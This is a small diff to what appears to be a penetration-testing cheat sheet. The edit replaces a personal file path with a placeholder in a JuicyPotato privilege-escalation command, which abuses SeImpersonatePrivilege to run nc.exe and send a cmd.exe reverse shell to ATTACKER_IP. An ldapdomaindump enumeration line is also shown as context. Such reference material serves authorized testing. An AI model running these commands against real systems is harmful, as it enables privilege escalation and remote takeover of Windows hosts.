@@ -576,5 +576,5 @@ ldapdomaindump -u 'domain.local\user' -p 'password' targetIP
 
 SeImpersonatePrivilege (JuicyPotato.exe)
 ```
-.\JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -l 1337 -a "/c C:\Users\tolis\Desktop\nc.exe -e C:\Windows\System32\cmd.exe ATTACKER_IP ATTACKER_PORT"
+.\JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -l 1337 -a "/c C:\PATH\TO\nc.exe -e C:\Windows\System32\cmd.exe ATTACKER_IP ATTACKER_PORT"
 ```
